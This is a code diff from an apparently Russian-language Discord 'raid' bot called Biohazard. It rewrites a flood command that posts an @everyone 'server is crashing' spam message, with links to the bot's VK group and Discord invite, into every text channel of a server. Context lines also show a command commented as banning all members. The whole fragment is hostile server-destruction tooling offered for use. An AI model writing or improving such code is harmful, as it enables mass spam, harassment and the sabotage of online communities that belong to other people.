@@ -77,13 +77,12 @@ class MyClient(discord.Client):
 					pass
 				
 			if message.content == '*флуд': #флуд
+				spam = '@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'
+				await message.delete()
 				for i in message.guild.text_channels:
-					await message.delete()
-					await asyncio.sleep(0.1)
-					try:
-						await i.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC') #отправка сообщения
-					except:
-						pass
+					await i.send(spam)
+					
+						
 				
 			if message.content == '*всембан': #бан всех участников
 				await message.delete()
